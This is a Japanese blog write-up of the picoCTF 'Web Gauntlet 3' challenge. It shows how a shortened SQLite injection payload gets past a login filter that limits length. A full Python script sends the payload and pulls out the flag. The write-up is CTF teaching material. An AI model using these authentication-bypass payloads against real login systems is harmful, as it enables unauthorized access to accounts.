---
title: 'WebGauntlet3 - picoCTF'
description: 'Web Gauntlet3のWriteupです。'
pubDate: 2025-12-30
category: 'CTF'
tags: ['picoCTF', 'Writeup', 'Web', 'SQLi', 'SQLite']
---

# WebGauntlet3 - picoCTF

## 初期調査

前回の[WebGauntlet2](https://blog.towaos.com/p/webgauntlet2-picoctf/)のfilter強化版\
しかし、強化されたのは文字数制限のみ(35 -> 25)

前回使用した payload
```py
# 31文字
data = {
  "user": "'||'ad'||'min'||'",
  "pass": "'IS NOT 0 ||'"
}
```

今回このpayloadを使用すると文字制限でブロックされた。\
前回のpayloadは無駄が多かったので`user`の部分を改良するだけで突破できる。

## Exploit

```py
import requests
from urllib.parse import *
import re

URL = "http://challenge-host"
s = requests.Session()

# 22文字
data = {
  "user": "ad'||'min",
  "pass": "'IS NOT 0 ||'"
}

req = s.post(URL, data=data)

endpoint = "/filter.php"

req = s.get(urljoin(URL, endpoint))

flag = re.search(r"picoCTF\{[^}]+\}", req.text).group(0)
print(flag)
```

実行:

```bash
$ python3 exploit.py
picoCTF{***}
```